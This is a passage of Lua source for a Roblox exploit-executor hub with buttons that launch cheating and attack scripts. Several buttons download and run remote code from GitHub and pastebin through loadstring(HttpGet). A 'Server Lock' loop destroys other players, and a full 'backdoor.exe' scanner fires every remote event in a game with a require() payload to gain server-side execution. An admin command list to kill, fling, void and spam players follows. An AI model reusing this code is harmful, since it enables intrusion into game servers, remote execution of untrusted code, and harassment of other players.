o225.Parent = o222
o225.Pitch = 1
o225.SoundId = "http://roblox.com/asset/?id=233931573"
o225.Volume = 1
o226 = Instance.new("Sound")
o226.Name = "M2"
o226.Pitch = 1.7
o226.Parent = o222
o226.SoundId = "0"
o226.Volume = 1
o227 = Instance.new("Sound")
o227.Name = "Fire"
o227.Parent = o222
o227.Pitch = 1.25
o227.SoundId = "http://roblox.com/asset/?id=258193800"
o227.PlayOnRemove = true
o228 = Instance.new("Sound")
o228.Name = "M3"
o228.Parent = o222
o228.SoundId = "0"
o228.Volume = 1
o228.PlayOnRemove = true
o229 = Instance.new("Part")
o229.Parent = o1
o229.Material = Enum.Material.SmoothPlastic
o229.BrickColor = BrickColor.new("Neon orange")
o229.Position = Vector3.new(-113.539955, 1.46897221, 61.2999878)
o229.Rotation = Vector3.new(90.0000153, 5.00937495e-006, 180)
o229.Anchored = true
o229.CFrame = CFrame.new(-113.539955, 1.46897221, 61.2999878, -1, -1.94638273e-012, 8.74300881e-008, -8.74301023e-008, 2.38417329e-007, -0.999991596, 2.10141236e-012, -0.999991596, -2.38417329e-007)
o229.FormFactor = Enum.FormFactor.Custom
o229.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o229.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o229.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o229.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o229.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o229.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o229.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o229.Color = Color3.new(0.835294, 0.45098, 0.239216)
o230 = Instance.new("SpecialMesh")
o230.Parent = o229
o230.Scale = Vector3.new(0.916666687, 0.0833333358, 0.0833333358)
o230.MeshType = Enum.MeshType.Wedge
o231 = Instance.new("Part")
o231.Parent = o1
o231.Material = Enum.Material.SmoothPlastic
o231.BrickColor = BrickColor.new("Really black")
o231.Position = Vector3.new(-113.539955, 1.41896868, 62.2083168)
o231.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o231.Anchored = true
o231.CFrame = CFrame.new(-113.539955, 1.41896868, 62.2083168, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o231.FormFactor = Enum.FormFactor.Custom
o231.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o231.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o231.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o231.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o231.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o231.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o231.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o231.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o232 = Instance.new("CylinderMesh")
o232.Parent = o231
o232.Scale = Vector3.new(0.5, 1, 0.5)
o233 = Instance.new("Part")
o233.Parent = o1
o233.Material = Enum.Material.SmoothPlastic
o233.BrickColor = BrickColor.new("Really black")
o233.Position = Vector3.new(-113.539955, 1.41896856, 62.8066254)
o233.Rotation = Vector3.new(-89.9999924, -5.20843257e-010, 1.22437671e-010)
o233.Anchored = true
o233.CFrame = CFrame.new(-113.539955, 1.41896856, 62.8066254, 1, -2.13694058e-012, -9.0904298e-012, 9.0904298e-012, 1.63912873e-007, 1, -2.13693885e-012, -1, 1.63912887e-007)
o233.FormFactor = Enum.FormFactor.Custom
o233.Size = Vector3.new(0.200000003, 2.13000011, 0.200000003)
o233.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o233.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o233.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o233.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o233.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o233.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o233.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o234 = Instance.new("Decal")
o234.Parent = o233
o234.Texture = "http://www.roblox.com/asset/?id=47760372"
o234.Face = Enum.NormalId.Bottom
o235 = Instance.new("CylinderMesh")
o235.Parent = o233
o235.Scale = Vector3.new(0.416666687, 1, 0.416666687)
o236 = Instance.new("Part")
o236.Parent = o1
o236.Material = Enum.Material.SmoothPlastic
o236.BrickColor = BrickColor.new("Really black")
o236.Position = Vector3.new(-113.509956, 1.69896829, 63.7049255)
o236.Rotation = Vector3.new(-90, -24.9996357, 2.5930288e-007)
o236.Anchored = true
o236.CFrame = CFrame.new(-113.509956, 1.69896829, 63.7049255, 0.906310558, -4.10167988e-009, -0.422612488, 0.422612488, 1.3219875e-007, 0.906310558, 5.21514458e-008, -1, 1.21546535e-007)
o236.FormFactor = Enum.FormFactor.Custom
o236.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o236.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o236.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o236.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o236.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o236.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o236.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o236.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o237 = Instance.new("BlockMesh")
o237.Parent = o236
o237.Scale = Vector3.new(0.0416666679, 0.333333343, 0.166666672)
o238 = Instance.new("Part")
o238.Parent = o1
o238.Material = Enum.Material.SmoothPlastic
o238.BrickColor = BrickColor.new("Really black")
o238.Position = Vector3.new(-113.539955, 1.07028496, 60.0163193)
o238.Rotation = Vector3.new(-134.999985, -5.91992693e-006, 180)
o238.Anchored = true
o238.CFrame = CFrame.new(-113.539955, 1.07028496, 60.0163193, -1, -1.50998176e-007, -1.03322215e-007, -1.79831659e-007, 0.707106709, 0.707106948, -3.37120198e-008, 0.707106948, -0.707106709)
o238.FormFactor = Enum.FormFactor.Custom
o238.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o238.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o238.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o238.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o238.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o238.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o238.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o238.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o239 = Instance.new("BlockMesh")
o239.Parent = o238
o239.Scale = Vector3.new(0.833333373, 0.666666687, 0.166666672)
mas.Parent = workspace
mas:MakeJoints()
local mas1 = mas:GetChildren()
for i=1,#mas1 do
	mas1[i].Parent = workspace 
	ypcall(function() mas1[i]:MakeJoints() end)
end
mas:Destroy()
for i=1,#cors do
coroutine.resume(cors[i])
end
o1.Parent = game.Players.GrownGreen.Backpack
end)

tab:Button("Rainbow Vomit", function()
--[[
 
    Rainbow Vomit FD Script
 Written By iiX0Lord :D
 
 If you edit please give credit


     Press X to start/Stop



    Thanks to Infected_Cow for helping with some of the scripting
--]]











wait(.5)

local key = Enum.KeyCode.X -- The key required to start/stop the vomit

--Do not edit anything beyond this point unless you know hwat your doing!!




local player = game.Players.LocalPlayer
local character = player.Character
local humanoid = character.Humanoid
local debris = game:GetService("Debris")
local NotificationBindable = Instance.new("BindableFunction")
NotificationBindable.OnInvoke = callback


local r  = game:GetService("RunService")
local c = game:GetService("ContextActionService")

local z = Instance.new("Part")
z.Size = Vector3.new(0.25, 0.29, 0.27) -- Size of the vomit
z.Material = "SmoothPlastic"

game.StarterGui:SetCore("SendNotification", {
 Title = "Rainbow Vomit";
 Text = "Rainbow Vomit Made By iiX0Lord";
 Icon = "";
 Duration = 6;
 Callback = NotificationBindable;
})


function xyz(actionName,inputState,inputObj)-- Starting function
 if inputState == Enum.UserInputState.Begin then
  r:BindToRenderStep("xyz",1,function()
   local offset = Vector3.new(0,-0.3,-0.8)-- Position of the vomit
  local x = z:Clone()
  x.Color = Color3.fromHSV(tick()%1,1,1)-- Makes it rainbow
  x.CFrame = player.Character.HumanoidRootPart.CFrame - Vector3.new(-4,-0.5,0) -- Position of the vomit
  x.CFrame = player.Character.Head.CFrame*CFrame.new(offset)
  x.Orientation = x.Orientation + Vector3.new(0,-90,0)-- The way it's pointing
  x.Parent = workspace
  debris:AddItem(x,3)--Waits and deletes the blocks
 end)
end
if inputState == Enum.UserInputState.End then -- Ending function
 r:UnbindFromRenderStep("xyz")
 end
end
c:BindAction("xyz",xyz,false,key)
end)

local tab = win:Tab("Random stuff")

tab:Button("Ro-Xploit 5.0 [FD]", function()
loadstring(game:GetObjects("rbxassetid://288646117")[1].Source)()
end)

tab:Button("c00lgui [FD]", function()
loadstring(Game:GetObjects("rbxassetid://166327202")[1].Source)()
end)

tab:Button("Server Lock [FD]", function()
while true do
for a, xb in pairs(game.Players:children()) do
if xb.Name~=game.Players.LocalPlayer.Name then xb:Destroy() end
end
wait(.69)
end
end)

tab:Button("RC7 Explorer [??]", function()
TextProperties = {"ClassName", "Name", "Value", "Text", "Reflectance", "Transparency", "Heat", "TeamName", "WalkSpeed", "Health", "MaxHealth", "Size", "Position", "AccountAge", "RobloxLocked", "TeamColor", "userId", "Brightness", "Ambient", "TimeOfDay", "FieldOfView", "CameraType", "LinkedSource"}
BoolProperties = {"Anchored", "CanCollide", "Disabled", "Jump", "Sit", "Visible", "Enabled", "Locked", "FilteringEnabled", "StreamingEnabled", "GlobalShadows"}
BrickColorProperties = {"BrickColor", "Color", "TeamColor", "Texture", "Value"}
s = Instance.new("ScreenGui", game.CoreGui)
pgr = Instance.new("TextButton")
pgr.Parent = s
pgr.Size = UDim2.new(0,100,0,40)
pgr.Position = UDim2.new(0,30,0,440)
pgr.Text="Explorer"
pgr.BackgroundTransparency = 0.3
pgr.TextColor = BrickColor.new("White")
pgr.BackgroundColor = BrickColor.new("Really Black")
pgr.BorderColor = BrickColor.new("Black")
pgr.Font = "ArialBold"
pgr.FontSize = "Size14"
pgr.TextStrokeColor3 = Color3.new(0/0,0/0,0/0)
pgr.TextStrokeTransparency = 0.3
pgr.BorderSizePixel = 1
pgr.BorderColor = BrickColor.new("White")

if game.CoreGui:findFirstChild("Explorer") then 
    game.CoreGui:findFirstChild("Explorer"):Remove() 
end

local Cloned
local Deleted
local DeleteParent
local Player
local Search
local ScriptSearch
local Gui
local Cloned = nil
local Deleted = nil
local DeleteParent = nil
local Current = 0
local CurrentOption = 0

function Clear()
    if Gui then 
        Gui:Remove() 
    end
    Current = 0
    CurrentOption = 0
end

function AddButton(N, Function, Color, Copy)
    if not N then 
        error("RenderButton - No Name Specified")
    end
    if not Function then 
        error("RenderButton - No Function Specified") 
    end
    if not Color then 
        Color = Color3.new(1, 1, 1) 
    end
    if Copy == nil then 
        Copy = true 
    end
    P = Instance.new("TextButton")
    if Copy then
        P.Size = UDim2.new(0, 110, 0, 20)
    else
        P.Size = UDim2.new(0, 130, 0, 20)
    end
    P.Text = N.Name
    P.Name = N.Name
    P.Parent = Gui
    P.BackgroundColor3 = Color
    P.TextColor3 = Color3.new(0, 0, 0)
    P.BackgroundTransparency = 0.5
    P.Position = UDim2.new(0, ((math.modf(Current/30))*150)+300, 0, 50+(20*((Current%30)-1)))
    P.MouseButton1Click:connect(function() 
        Function(P) 
    end)
    D = Instance.new("TextButton")
    D.Size = UDim2.new(0, 20, 0, 20)
    D.Text = "X"
    D.Name = N.Name
    D.Parent = Gui
    D.BackgroundColor3 = Color3.new(1, 0, 0)
    D.TextColor3 = Color3.new(0, 0, 0)
    D.BackgroundTransparency = 0.5
    D.Position = UDim2.new(0, ((math.modf(Current/30))*150)+300+130, 0, 50+(20*((Current%30)-1)))
    D.MouseButton1Click:connect(function()
        Deleted = N
        DeleteParent = N.Parent
        N.Parent = nil
        Clear()
        Search(DeleteParent)
    end)
    if Copy then
        C = Instance.new("TextButton")
        C.Size = UDim2.new(0, 20, 0, 20)
        C.Text = "C"
        C.Name = N.Name
        C.Parent = Gui
        C.BackgroundColor3 = Color3.new(0, 1, 0.5)
        C.TextColor3 = Color3.new(0, 0, 0)
        C.BackgroundTransparency = 0.5
        C.Position = UDim2.new(0, ((math.modf(Current/30))*150)+300+110, 0, 50+(20*((Current%30)-1)))
        C.MouseButton1Click:connect(function()
            Cloned = N
            Clear()
            Search(N.Parent)
        end)
    end
    Current = Current + 1
    return P
end
    
function AddOption(N, Function, Color, Text)
    if not N then 
        error("RenderButton - No Name Specified") 
    end
    if not Color then 
        Color = Color3.new(1, 1, 1) 
    end
    if Text == nil then 
        Text = false 
    end
    if Text then
        P = Instance.new("TextBox")
    else
        P = Instance.new("TextButton")
    end
    P.Text = N
    P.Name = N
    P.Parent = Gui
    P.BackgroundColor3 = Color
    P.TextColor3 = Color3.new(0, 0, 0)
    P.BackgroundTransparency = 0.5
    P.Size = UDim2.new(0, 150, 0, 20)
    P.Position = UDim2.new(0, ((math.modf(CurrentOption/30))*150)+150, 0, 50+(20*((CurrentOption%30)-1)))
    if not Text and Function then
        P.MouseButton1Click:connect(function() Function(P) end)
    end
    CurrentOption = CurrentOption + 1
    return P
end

function AddTextOption(Obj, Prop)
    local Ob = Obj
    local Pro = Prop
    if type(Ob[Pro]) == "number" or type(Ob[Pro]) == "string" then
        CurrentOption = CurrentOption + 1
        local T = AddOption(Ob[Pro], nil, Color3.new(0.1, 0.4, 0.1), true)
        CurrentOption = CurrentOption - 2
        local O = AddOption("Change "..Pro..":", function() Ob[Pro] = T.Text end, Color3.new(0.1, 0.8, 0.1), false)
        CurrentOption = CurrentOption + 1
    end
end

function AddBrickColorOption(Obj, Prop)
    local Ob = Obj
    local Pro = Prop
    if BrickColor.new(tostring(Ob[Pro])) == Ob[Pro] then
        CurrentOption = CurrentOption + 1
        local T = AddOption(tostring(Ob[Pro]), nil, Color3.new(0.1, 0.4, 0.1), true)
        CurrentOption = CurrentOption - 2
        local O = AddOption("Change "..Pro..":", function() Ob[Pro] = BrickColor.new(T.Text) end, Color3.new(0.1, 0.8, 0.1), false)
        CurrentOption = CurrentOption + 1
    end
end

function AddBoolOption(Obj, Prop)
    local Ob = Obj
    local Pro = Prop
    if type(Ob[Pro]) == "boolean" then
        local O = AddOption(Pro..": "..tostring(Ob[Pro]), nil, Color3.new(0.1, 0.8, 0.1), false)
        O.MouseButton1Click:connect(function()
            if Ob[Pro] then
                Ob[Pro] = false
                O.Text = Pro..": false"
            else
                Ob[Pro] = true
                O.Text = Pro..": true"
            end
        end)
    end
end

function TestProperty(Obj, Property)
    Success = pcall(function() 
        if Obj[Property] then 
            return 
        end 
    end)
    return Success
end

function LoadOptions(Object)
    for Num, Prop in pairs(TextProperties) do
        if TestProperty(Object, Prop) then
            AddTextOption(Object, Prop)
        end
    end
    for Num, Prop in pairs(BoolProperties) do
        if TestProperty(Object, Prop) then
            AddBoolOption(Object, Prop)
        end
    end
    for Num, Prop in pairs(BrickColorProperties) do
        if TestProperty(Object, Prop) then
            AddBrickColorOption(Object, Prop)
        end
    end
end

function Search(Object)
    Gui = Instance.new("ScreenGui")
    Gui.Parent = game.CoreGui
    Gui.Name = "Explorer"
    if Object ~= game then
        AddOption("Back", function() 
            Clear(); 
            Search(Object.Parent) 
        end, Color3.new(0.5, 1, 1), false)
    end
    AddOption("Reload", function() Clear(); Search(Object); end, Color3.new(0.2, 1, 0.2), false)
    if Cloned then
        AddOption("Paste", function() Cloned:Clone().Parent = Object; Clear(); Search(Object); end, Color3.new(0.5, 1, 1), false)
    end
    if Deleted then
        AddOption("Undo", function() Deleted.Parent = DeleteParent; Deleted = nil; DeletedParent = nil; Clear(); Search(Object); end, Color3.new(1, 0.6, 0.1), false)
    end
    if Object:IsA("Player") then
        AddOption("Goto Character", function() Clear(); if Object.Character then Search(Object.Character); end end, Color3.new(1, 1, 1), false)
    end
    if Object:IsA("LocalScript") then
        AddOption("EditScript", function() Clear(); ScriptSearch(Object); end, Color3.new(1, 1, 1), false)
    end
    if Object:IsA("Terrain") then
        AddOption("Clear", function() Object:Clear(); end, Color3.new(1, 1, 1), false)
    end
    LoadOptions(Object)
    AddOption("Close", Clear, Color3.new(1, 0.2, 0), false)
    if not Object:IsA("Workspace") or not Object:IsA("Player") then
        for Num, Obj in pairs(Object:GetChildren()) do
            --if not Obj:IsA("BasePart") or not Object.Parent == game.Workspace then
            if true then
                if Obj:IsA("LocalScript") then
                    AddButton(Obj, function() Clear(); Search(Obj); end, Color3.new(1, 0, 0), true)
                elseif Obj:IsA("Script") or Obj:IsA("StarterScript") or Obj:IsA("CoreScript") then
                    AddButton(Obj, function() Clear(); Search(Obj); end, Color3.new(0.5, 0.5, 0.8), true)
                elseif Obj.Parent == game then
                    AddButton(Obj, function() Clear(); Search(Obj); end, Color3.new(1, 1, 1), false)
                else
                    AddButton(Obj, function() Clear(); Search(Obj); end, Color3.new(1, 1, 1), true)
                end
            end
        end
    end
    function MoveUp(Place, Amount)
        for i,v in pairs(Place:GetChildren()) do
            if v:IsA("TextLabel") or v:IsA("TextBox") then
                v.Position = v.Position + UDim2.new(0,0,0,-Amount)
            end
        end
    end
    function MoveDown(Place, Amount)
        for i,v in pairs(Place:GetChildren()) do
            if v:IsA("TextLabel") or v:IsA("TextBox") then
                v.Position = v.Position + UDim2.new(0,0,0,Amount)
            end
        end
    end
    i=0
    function ScriptSearch(S)
        Script2 = S
        Script = Script2.Source
        Table = {}
        Enabled = true
        Gui = Instance.new("ScreenGui")
        Gui.Parent = game.CoreGui
        Gui.Name = "Explorer"
        while Enabled do
            Start, End = string.find(Script, '\n')
            print(Start, End)
            if Start and End then
                table.insert(Table, string.sub(Script, 1, End))
                New = string.sub(Script, End+1, string.len(Script))
                Script = New
            else
                Enabled = false
                table.insert(Table, string.sub(Script, 1, End))
                print("Finished")
            end
        end
        P = Instance.new("TextLabel")
        P.Size = UDim2.new(0, 500, 0, 20)
        P.Text = Script2.Name
        P.Name = "Script Line"
        P.Parent = Gui
        P.BackgroundColor3 = Color3.new(1, 1, 1)
        P.TextColor3 = Color3.new(0, 0, 0)
        P.BackgroundTransparency = 0.5
        P.Position = UDim2.new(0.5, -250, 0, 150+(20*(i-1)))
        P.TextXAlignment = "Left"
        i=i+1
        New = {}
        for I,Val in pairs(Table) do
            print(Val)
            P = Instance.new("TextBox")
            P.ClearTextOnFocus = false
            P.Size = UDim2.new(0, 500, 0, 20)
            P.Text = Val
            P.Name = "Script Line"
            P.Parent = Gui
            P.BackgroundColor3 = Color3.new(1, 1, 1)
            P.TextColor3 = Color3.new(0, 0, 0)
            P.BackgroundTransparency = 0.5
            P.Position = UDim2.new(0.5, -250, 0, 150+(20*(i-1)))
            P.TextXAlignment = "Left"
            table.insert(New, P)
            i=i+1
        end
        i=1
        P = Instance.new("TextButton")
        P.Size = UDim2.new(0, 20, 0, 20)
        P.Text = "^"
        P.Name = "Scroll"
        P.Parent = Gui
        P.BackgroundColor3 = Color3.new(1, 1, 1)
        P.TextColor3 = Color3.new(0, 0, 0)
        P.BackgroundTransparency = 0.5
        P.Position = UDim2.new(0.5, -270, 0, 150+(20*(i-1)))
        P.MouseButton1Click:connect(function() 
            MoveUp(Gui, -20) 
        end)
        i=i+1
        P = Instance.new("TextButton")
        P.Size = UDim2.new(0, 20, 0, 20)
        P.Text = "v"
        P.Name = "Scroll"
        P.Parent = Gui
        P.BackgroundColor3 = Color3.new(1, 1, 1)
        P.TextColor3 = Color3.new(0, 0, 0)
        P.BackgroundTransparency = 0.5
        P.Position = UDim2.new(0.5, -270, 0, 150+(20*(i-1)))
        P.MouseButton1Click:connect(function() 
            MoveDown(Gui, -20) 
        end)
        i=i+1
        P = Instance.new("TextButton")
        P.Size = UDim2.new(0, 20, 0, 20)
        P.Text = "^^"
        P.Name = "Scroll"
        P.Parent = Gui
        P.BackgroundColor3 = Color3.new(1, 1, 1)
        P.TextColor3 = Color3.new(0, 0, 0)
        P.BackgroundTransparency = 0.5
        P.Position = UDim2.new(0.5, -270, 0, 150+(20*(i-1)))
        P.MouseButton1Click:connect(function() 
            MoveUp(Gui, -200) 
        end)
        i=i+1
        P = Instance.new("TextButton")
        P.Size = UDim2.new(0, 20, 0, 20)
        P.Text = "vv"
        P.Name = "Scroll"
        P.Parent = Gui
        P.BackgroundColor3 = Color3.new(1, 1, 1)
        P.TextColor3 = Color3.new(0, 0, 0)
        P.BackgroundTransparency = 0.5
        P.Position = UDim2.new(0.5, -270, 0, 150+(20*(i-1)))
        P.MouseButton1Click:connect(function() 
            MoveDown(Gui, -200) 
        end)
        i=i+1
        P = Instance.new("TextButton")
        P.Size = UDim2.new(0, 20, 0, 20)
        P.Text = "S"
        P.Name = "Save"
        P.Parent = Gui
        P.BackgroundColor3 = Color3.new(0, 1, 0)
        P.TextColor3 = Color3.new(0, 0, 0)
        P.BackgroundTransparency = 0.5
        P.Position = UDim2.new(0.5, -270, 0, 150+(20*(i-1)))
        P.MouseButton1Click:connect(function()
            StringS = ""
            for Num, Obj in pairs(New) do
                StringS = StringS..Obj.Text..'\n'
            end
            S.Source = StringS
            S.Disabled = true
            S.Disabled = false
        end)
        i=i+1
        P = Instance.new("TextButton")
        P.Size = UDim2.new(0, 20, 0, 20)
        P.Text = "x"
        P.Name = "Back"
        P.Parent = Gui
        P.BackgroundColor3 = Color3.new(1, 0.2, 0)
        P.TextColor3 = Color3.new(0, 0, 0)
        P.BackgroundTransparency = 0.5
        P.Position = UDim2.new(0.5, -270, 0, 150+(20*(i-1)))
        P.MouseButton1Click:connect(function()
            Clear()
            i=0
            Search(S)
        end)
        i=i+1
    end
end

pgr.MouseButton1Click:connect(function()
    Clear()
    Search(game)
end)
end)

local tab = win:Tab("SS Loaders")

tab:Button("Frakture SS [FE]", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/L1ghtingBolt/FraktureSS/master/source.lua'),true))()
end)

tab:Button("TntmastersSS [FE]", function()
loadstring(game:HttpGet("https://pastebin.com/raw/hi4mDR43"))()
end)

tab:Button("jalon's backdeer skenner", function()
loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/scripts/main/backdoor-executor/backdoor-executor.lua"))()
end)

tab:Button("Backdoor.exe", function()
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
--[[
    backdoor.exe, the best backdoor scanner in Roblox.
    Copyright (C) 2021	iK4oS

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
]]

local LocalPlayer = game:GetService("Players").LocalPlayer
local requireScript = ("require(7924358164):k4scripts('%s')"):format(LocalPlayer.Name)
local invCode = "6HndYgC"

local alternativeSS = {
	run = { [1] = "5#lGIERKWEF" },
	emma = { [1] = "pwojr8hoc0-gr0yxohlgp-0feb7ncxed", [2] = ",,,,,,,,,,,,,,," },
	helpme = { [1] = "helpme" },
	pickett = { [1] = "cGlja2V0dA==" },
	harked = "https://raw.githubusercontent.com/iK4oS/backdoor.exe/indev/harkedSS.lua"
}

local function notify(text)
	game:GetService("StarterGui"):SetCore(
	"SendNotification",
		{
			Title = "backdoor.exe",
			Duration = 3,
			Text = text
		}
	)
end

local function attached(possibleWait)
	if possibleWait then wait(possibleWait) end
	return LocalPlayer.PlayerGui:FindFirstChild("backdoor.exe")
end

local function validRemote(rm, _className)
	local fullName =  rm:GetFullName()
	
	if string.find(fullName, "DefaultChat") then return false end
	if string.find(fullName, LocalPlayer.Name) then return false end
	if rm:FindFirstChild("__FUNCTION") then return false end
	if rm.Parent == game:GetService("JointsService") then return false end
	
	if rm.ClassName ~= _className then return false end

	if getgenv().blacklisted then
		if table.find(getgenv().blacklisted, fullName) then return false end
	end

	return true
end

local function harked()
	local backpack = LocalPlayer.Backpack 
	return backpack:FindFirstChild("HandlessSegway") and
		Backpack.HandlessSegway:FindFirstChild("RemoteEvents") and
		Backpack.HandlessSegway.RemoteEvents:FindFirstChild("DestroySegway")
end
local function emmaBackdoor(rm)
	return rm.Name == "emma" and rm.Parent.Name == "mynameemma"
end
local function runBackdoor(rm)
	return rm.Name == "Run" and
	rm.Parent:FindFirstChild("Pages") and rm.Parent:FindFirstChild("R6") and
	rm.Parent:FindFirstChild("Version") and rm.Parent:FindFirstChild("Title")
end

local function scanGame()
    notify("Scanning for a backdoor.")
	if harked() then
		loadstring(game:HttpGetAsync(alternativeSS.harked))()
		return
	end

	for _, remote in pairs(game:GetDescendants()) do
		if validRemote(remote, "RemoteEvent") and not attached() then
			if emmaBackdoor(remote) then
				remote:FireServer(unpack(alternativeSS.emma), requireScript)
			end
			if runBackdoor(remote) then
				remote:FireServer(unpack(alternativeSS.run), requireScript)
			end

			remote:FireServer(unpack(alternativeSS.helpme), requireScript)
			remote:FireServer(unpack(alternativeSS.pickett), requireScript)
			remote:FireServer(requireScript)

		end
	end

	for _, remote in pairs(game:GetDescendants()) do
		if validRemote(remote, "RemoteFunction") and not attached() then
			remote:InvokeServer(requireScript)
		end
	end

end

local function Main()
	notify("Make sure to join our Discord!\nCode: "..invCode)

	scanGame()
	
	if not attached(2) then
		notify("Unable to find backdoor.\nGame not backdoored?")
	end
end

if game:IsLoaded() then
	pcall(Main)
end

--	k4scripts
--	.------.
--	|4.--. |
--	| :│/: |
--	| :│\: |
--	| '--'4|
--	`------'
end)

local tab = win:Tab("Gui's")

tab:Button("Novice GUI [FE]", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Amphvptere/Novice/main/SHADrpg"))()
end)

tab:Button("OP Script GUI [??]", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/WinterDinder/Break-Grimace-Shake/main/Main", true))()
end)

tab:Button("Ice hub [FE]", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
end)

local tab = win:Tab("Admin")

tab:Button("Infinite Yield [FE]", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

tab:Button("CMD-X [FE]", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source', true))()
end)

tab:Button("Nameless admin [FE]", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
end)

tab:Button("Reviz Admin [FE]", function()
-- Creator: illremember#3799
 
-- Credits to infinite yield, harkinian, dex creators
 
prefix = ";"
wait(0.3)
Commands = {
    '[-] cmdbar is shown when ; is pressed.',
    '[1] kill [plr] -- You need a tool! Will kill the player, use rkill to kill you and player',
    '[2] bring [plr] -- You need a tool! Will bring player to you',
    '[3] spin [plr] -- You need a tool! Makes you and the player spin crazy',
    '[4] unspin -- Use after using spin cmd and dying, so you stop loop teleporting',
    '[5] attach [plr] -- You need a tool! Attaches you to player',
    '[6] unattach [plr] -- Attempts to unattach you from a player',
    '[7] follow [plr] -- Makes you follow behind the player',
    '[8] unfollow',
    '[9] freefall [plr] -- You need a tool! Teleports you and the player up into the air',
    '[10] trail [plr] -- The opposite of follow, you stay infront of player',
    '[11] untrail',
    '[12] orbit [plr] -- Makes you orbit the player',
    '[13] unorbit',
    '[14] fling [plr] -- Makes you fling the player',
    '[15] unfling',
    '[16] fecheck -- Checks if the game is FE or not',
    '[17] void [plr] -- Teleports player to the void',
    '[18] noclip -- Gives you noclip to walk through walls',
    '[19] clip -- Removes noclip',
    '[20] speed [num]/ws [num] -- Changes how fast you walk 16 is default',
    '[21] jumppower [num]/jp [num] -- Changes how high you jump 50 is default',
    '[22] hipheight [num]/hh [num] -- Changes how high you float 0 is default',
    '[23] default -- Changes your speed, jumppower and hipheight to default values',
    '[24] annoy [plr] -- Loop teleports you to the player',
    '[25] unannoy',
    '[26] headwalk [plr] -- Loop teleports you to the player head',
    '[27] unheadwalk',
    '[28] nolimbs -- Removes your arms and legs',
    '[29] god -- Gives you FE Godmode',
    '[30] drophats -- Drops your accessories',
    '[31] droptool -- Drops any tool you have equipped',
    '[32] loopdhats -- Loop drops your accessories',
    '[33] unloopdhats',
    '[34] loopdtool -- Loop drops any tools you have equipped',
    '[35] unloopdtool',
    '[36] invisible -- Gives you invisibility CREDIT TO TIMELESS',
    '[37] view [plr] -- Changes your camera to the player character',
    '[38] unview',
    '[39] goto [plr] -- Teleports you to player',
    '[40] fly -- Allows you to fly, credit to Infinite Yield',
    '[41] unfly',
    '[42] chat [msg] -- Makes you chat a message',
    '[43] spam [msg] -- Spams a message',
    '[44] unspam',
    '[45] spamwait [num] -- Changes delay of chatting a message for the spam command in seconds default is 1 second',
    '[46] pmspam [plr] -- Spams a player in private message',
    '[47] unpmspam',
    '[48] cfreeze [plr] -- Freezes a player on your client, they will only be frozen for you',
    '[49] uncfreeze [plr]',
    '[50] unlockws -- Unlocks the workspace',
    '[51] lockws -- Locks the workspace',
    '[52] btools -- Gives you btools that will only show to you useful for deleting certain blocks only for you',
    '[53] pstand -- Enables platform stand',
    '[54] unpstand -- Disables platform stand',
    '[55] blockhead -- Removes your head mesh',
    '[56] sit',
    '[57] bringobj [obj] -- Only shows on client, brings an object/part to you constantly, can be used to bring healing parts, weapons, money etc, type in exact name',
    '[58] wsvis [num] -- Changes visibility of workspace parts, num should be between 0 and 1, only shows client sided',
    '[59] hypertotal -- Loads in my FE GUI Hypertotal',
